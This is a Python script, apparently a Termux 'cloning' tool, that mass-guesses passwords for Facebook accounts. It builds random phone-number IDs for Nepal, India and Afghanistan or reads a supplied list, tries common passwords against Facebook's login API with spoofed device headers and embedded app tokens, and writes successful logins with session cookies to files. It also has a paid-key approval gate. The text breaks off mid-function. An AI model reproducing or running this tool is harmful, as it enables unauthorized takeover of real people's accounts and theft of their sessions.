#!coding : utf-8
#!usr/lib/python3.11
#OPEN SOURCE BY SAIYAN
##------------------[ INSTALL-MENU ]------------------##
import uuid
import os,sys,time
import datetime,json
import random,string,re
import shutil,uuid,urllib
import zlib,subprocess,bs4
import requests,mechanize,rich
from string import *
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred

#───────────────[FAKE CPTHON]───────────────────────── #
#───────────────[BIT ROOM]───────────────────────── #
import os, platform, time, sys
#os.system('pkg install espeak ')
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mARAFAT×SAIYAN\33[1;91m⊁ ')
#os.system('espeak -a 300 " ,FILE CLONING 0.1, TOOLS,INSTALL Complete ,"')
time.sleep(1)
os.system('clear')
##
import os, platform, time, sys

try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")

print('\033[1;91m[\033[1;97m-\033[1;91m] \033[1;92mChecking For Update. . . .')
#os.system('espeak -a 300 " Waiting for Update,"')
time.sleep(2)


os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 64BIT USER')
 
elif bit == '32bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')

 #───────────────[BIT End]───────────────────────── #

princp=[]
#-----------------------------------------------------#
usr=[]
android_models=[]
#-----------------------------------------------------#
bARAFAT="\033[1;30m" 
M="\033[1;31m" 
W = '\x1b[1;97m' #white 
Y = '\x1b[1;93m' #yellow 
S = '\x1b[1;96m' #sky_blue    
H="\033[1;33m"               
byellow="\033[1;33m"     
bblue="\033[1;34m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
AA="\033[1;32m"
BB="\033[1;31m"
CC="\033[1;36m"
X='\033[1;30m'
XX="\x1b[38;5;196m"
GGG="\x1b[38;5;214m"
#-----------------------------------------------------#

din = datetime.datetime.now().now
mash = datetime.datetime.now().month
bosor = datetime.datetime.now().year

loop = 0
oks = []
cps = []
twf = []
bou = []
ugen = []
method = []
password = []

myid = uuid.uuid4().hex[:40].upper()
idmy = uuid.uuid4().hex[:6].upper()
try:
    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
except:
    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
    getx.write(myid+idmy)
    getx.close()
MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()

#-----------------------------------------------------#

  

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        sim_id+=fbcr
        else:
                fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                sim_id+=fbcr
except:
        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#-----------------------------------------------------#
kkkkki = random.choice(['SM-G920F','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def vivo():
    Anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    vir=str(random.choice(range(111111111,999999999)))
    cho=str(random.choice(range(43,447)))
    waid=str(random.choice(range(720,1500)))
    hight=str(random.choice(range(1500,2000)))
    model=random.choice(["vivo 1935","V3Max"])
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    ua="Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/QP1A.190711.020) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.8.106;FBPN/"+platform+";FBLC/in_ID;FBBV/"+vir+";FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/"+model+";FBSV/10;FBCA/arm64-v8a:null;FBDM/{density="+str(random.choice(range(1,4)))+".29375,width="+waid+",height="+hight+"};]"
    return ua
#-----------------------------------------------------#
os.system('xdg-open https://chat.whatsapp.com/Kyh2gU9DkDPFsJIGekbkug ')
logo1 = f"""{W}
{G}╔═╗╔═╗{W}╦╦ ╦{G}╔═╗╔╗╔ {W} ═╗ ╦  {G}╔═╗╦═╗{W}╔═╗╔═╗{G}╔═╗╔╦╗
{G}╚═╗╠═╣{W}║╚╦╝{G}╠═╣║║║{W}  ╔╩╦╝{G}  ╠═╣╠╦╝{W}╠═╣╠╣ {G}╠═╣ ║ 
{G}╚═╝╩ ╩{W}╩ ╩ {G}╩ ╩╝╚╝ {W} ╩ ╚═  {G}╩ ╩╩╚═{W}╩ ╩╚  {G}╩ ╩ ╩ \033[1;97mV\033[1;32m/\033[1;97m0.1
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m
{G}[{M}+{G}]{G} DEVELOPER  {M}●\033[1;97m {G}ARAFAT X SAIYAN
{G}[{M}+{G}] {G}FACEBOOK   {M}●\033[1;97m {G}ARAFAT HASAN       
{G}[{M}+{G}] {G}FACEBOOK   {M}●\033[1;97m {G}HUNTER SAIYAN      
{G}[{M}+{G}] {G}TOOL       {M}●\033[1;97m    (\033[1;32mTEST\033[1;97m)
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m"""

line = f"\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m"

def clear():os.system('clear');print(logo1)
def linex():print(line)

#                                                RANDOM M1 UP
kkkkki = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def ARAFAT2():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/433.0.0.31.111;FBBV/444411021;FBDM/{density=2.25,width=720,height=1280};FBLC/en_NP;FBRV/791484986;FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3663;FBSV/13;nullFBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,641=480,height=1041};FB_FW/1;]'
        return ua

class apvroval:
    def check():
        url = "https://github.com/arafat96698/AR/blob/main/approval.txt"
        url = "https://github.com/huntersaiyan/Aprv/blob/main/aprv.txt"
        import mechanize
        my_awm = mechanize.Browser()
        try:
            host = my_awm.open(url)
            check_key = str(host.read())
            if MY_KEY in check_key:
                Main.Awm()
            else:
                clear()
                print(f'{W}THIS TOOL IS PAID.SO,YOU NEED PERMISSION TO USE THIS TOOL')
                print(f'{W}YOUR KEY :  '+MY_KEY)
                os.system('xdg-open https://wa.me/+8801795194671 ')
                print('SEND YOUR KEY TO GET APPROVAL');linex()
        except Exception as e:
            print(e)
            exit()


class Main:
    def Awm():
        clear()
        print(f'{G}[{M}1{G}]{G} FILE CLONING')
        print(f'{G}[{M}2{G}]{G} RANDOM CLONING')
    #    print(f'{W}[\033[1;32m3\033[1;97m]{G} FOLLOW GITHUB')
        print(f'{G}[{M}4{G}]{G} EXIT PROGRAM')
        linex()
        awm = input(f'SELECT OPTION :{G} ');linex()
        if awm in ['1']:Awm_File()
        elif awm in ['2']:Awm_rndm()
        elif awm in ['3']:os.system('xdg-open https://github.com/AKASH-CYBER-196')
        elif awm in ['4']:sys.exit()
        else:Main.Awm()

def Awm_File():
    clear()
    file = input(f'[\033[1;32m~\033[1;97m] PUT FILE NAME  : ');linex()
    try:fo = open(file,'r').read().splitlines()
    except FileNotFoundError:Awm_File()
    limit = int(input(f'[\033[1;32m~\033[1;97m] TOTAL PASSWORD LIMIT : '));linex()
    for z in range(limit):
        print('[\033[1;32m~\033[1;97m] EXAMPLE : \033[1;32m[first last firstlast first1234]')
        password.append(input(f'\033[1;97m[\033[1;32m~\033[1;97m] PASSWORD NO.{z+1} : '));linex()
    #server = input(f' SERVER  : 1-2\n >>>{G} ');linex()
    #if server in ['1']:method.append('mA')
    #elif server in ['2']:method.append('mB')
    #elif server in ['3']:method.append('mC')
    with tred(max_workers=30) as My_Tanisha:
        tl = str(len(fo))
        clear()
        print(f"{G}[{M}+{G}] TOTAL ID\033[1;97m  : {G} {tl}{W}")
   #     print(f"TOTAL OK ID SAVE IN : {G}/sdcard/AxS-OK.txt{W}")
   #     print(f"TOTAL CP ID SAVE IN : {R}/sdcard/AxS-CP.txt{W}")
        print(f"{G}[{M}+{G}] IF NO RESULT {M}[{Y}ON{W}/{Y}OFF{M}] {G}AIRPLANE MODE")
        print(f"\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
        for user in fo:
            ids,names = user.split('|')
            passlist = password
            #if "mA" in method:My_Tanisha.submit(crack_file_A,ids,names,passlist)
            #elif "mB" in method:My_Tanisha.submit(crack_file_B,ids,names,passlist)
            #elif "mC" in method:My_Tanisha.submit(crack_file_C,ids,names,passlist)
            My_Tanisha.submit(crack_file_A,ids,names,passlist)
            #My_Tanisha.submit(crack_file_B,ids,names,passlist)
    print('')
    linex()
    print('THE PROCESS HAS BEEN COMPLETED')
    print(f'TOTAL OK  : {G} {str(len(oks))}')
    print(f'{W}TOTAL CP  : {R} {str(len(cps))}{W}')
    print(f'THANKS FOR USING MY TOOL')
    linex()

def Awm_rndm():
    clear()
    print(f'[1]  NEPAL UID CLONING')
    print(f'[2]  INDIA UID CLONING')
    print(f'[3]  AFGHANISTAN UID CLONING')
    linex()
    awm = input(f'SELECT OPTION  :{G} ');linex()
    if awm in ['1']:Akash.nepal()
    elif awm in ['2']:Akash.india()
    if awm in ['3']: Akash.afghan()
    else:Awm_rndm()

class Akash:
    def nepal():
        clear()
        print(f'EXAMPLE  : 9815,9814,9861,9840')
        code = input(f'SELECT   :{G} ');linex()
        print(f'EXAMPLE  : 10000,20000,30000')
        limit = int(input(f'SELECT   :{G} '));linex()
        for n in range(limit):
            awmx = "".join(random.choice(string.digits) for _ in range(6))
            bou.append(awmx)
        with tred(max_workers=35) as My_Tanisha:
            tl = str(len(bou))
            clear()
            print(f"TOTAL ID FROM CRACK : {S} {tl}{W}")
            print(f"TOTAL OK ID SAVE IN : {G}/sdcard/ARAFAT-OK.txt{W}")
            print(f"TOTAL CP ID SAVE IN : {R}/sdcard/ARAFAT-CP.txt{W}")
            print(f"NEPAL COUNTRY IDS CLONING STARTED...")
            print(f"\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
            for love in bou:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','lama123','lama12345','lama@123','gurung','gurung123','gurung12345','gurung@123','magar','magar123','magar12345','magar@123','tamang123','tamang@123','tamang12345']
                My_Tanisha.submit(crack_rand,ids,passlist)
        print('')
        linex()
        print('THE PROCESS HAS BEEN COMPLETED')
        print(f'TOTAL OK  : {G} {str(len(oks))}')
        print(f'{W}TOTAL CP  : {R} {str(len(cps))}{W}')
        print(f'THANKS FOR USING MY TOOL')
        linex()
    
    def afghan():
        clear()
        print(f'EXAMPLE  : 91637,91789,91620')
        code = input(f'SELECT   :{G} ');linex()
        print(f'EXAMPLE  : 10000,20000,30000')
        limit = int(input(f'SELECT   :{G} '));linex()
        for n in range(limit):
            awmx = "".join(random.choice(string.digits) for _ in range(7))
            bou.append(awmx)
        with tred(max_workers=30) as My_Tanisha:
            tl = str(len(bou))
            clear()
            print(f"TOTAL ID FROM CRACK : {S} {tl}{W}")
            print(f"TOTAL OK ID SAVE IN : {G}/sdcard/ARAFAT-OK.txt{W}")
            print(f"TOTAL CP ID SAVE IN : {R}/sdcard/ARAFAT-CP.txt{W}")
            print(f"INDIA COUNTRY IDS CLONING STARTED....")
            print(f"\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
            for love in bou:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'57273200','59039200','57575751','57575752']
                My_Tanisha.submit(crack_rand,ids,passlist)
        print('')
        linex()
        print('THE PROCESS HAS BEEN COMPLETED')
        print(f'TOTAL OK  : {G} {str(len(oks))}')
        print(f'{W}TOTAL CP  : {R} {str(len(cps))}{W}')
        print(f'THANKS FOR USING MY TOOL')
        linex()
        
    def nepal():
        clear()
        print(f'EXAMPLE  : 9815,9814,9861,9840')
        code = input(f'SELECT   :{G} ');linex()
        print(f'EXAMPLE  : 10000,20000,30000')
        limit = int(input(f'SELECT   :{G} '));linex()
        for n in range(limit):
            awmx = "".join(random.choice(string.digits) for _ in range(6))
            bou.append(awmx)
        with tred(max_workers=30) as My_Tanisha:
            tl = str(len(bou))
            clear()
            print(f"TOTAL ID FROM CRACK : {S} {tl}{W}")
            print(f"TOTAL OK ID SAVE IN : {G}/sdcard/ARAFAT-OK.txt{W}")
            print(f"TOTAL CP ID SAVE IN : {R}/sdcard/ARAFAT-CP.txt{W}")
            print(f"NEPAL COUNTRY IDS CLONING STARTED...")
            print(f"\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
            for love in bou:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','nepal@123','kathmandu123']
                My_Tanisha.submit(crack_rand,ids,passlist)
        print('')
        linex()
        print('THE PROCESS HAS BEEN COMPLETED')
        print(f'TOTAL OK  : {G} {str(len(oks))}')
        print(f'{W}TOTAL CP  : {R} {str(len(cps))}{W}')
        print(f'THANKS FOR USING MY TOOL')
        linex()
##------------------[ CRACK-MT ]------------------##
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{M}[{G}AXS-FIND{M}]{W}<>{M}[{Y}%s{M}]{W}<>{M}[{G}ALIVE:%s{M}]'%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {
            "email":ids,
            "password":pas,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "logged_out_id": str(uuid.uuid4()),
            "locale": "en_US",
            "client_country_code": "US", # --> From Parsing User Agent
            "cpl": "true",
            "source": "login",
            "format": "json",
            "omit_response_on_success": "false",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            "currently_logged_in_userid" : "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895", # --> Use App ID|Token/Sig
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig":"1d6bdac1d94b7eff5dfc99453b632a28"}
            head = {
            "User-Agent": vivo(),
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-connection-Token": "d29d67d37eca387482a8a5b740f84f62",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            }
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r{G}[AxS-OK] {ids} | {pas}')
                open('/sdcard/AxS-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{Y}[SAIYAN-CP] {ids} | {pas}')
                open('/sdcard/AxS-CP.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{M}[{G}FINDING{M}]{W}<>{M}[{Y}%s{M}]{W}<>{M}[{G}ALIVE:%s{M}]')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            "email":ids,
            "password":pas,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "logged_out_id": str(uuid.uuid4()),
            "locale": "en_US",
            "client_country_code": "US",
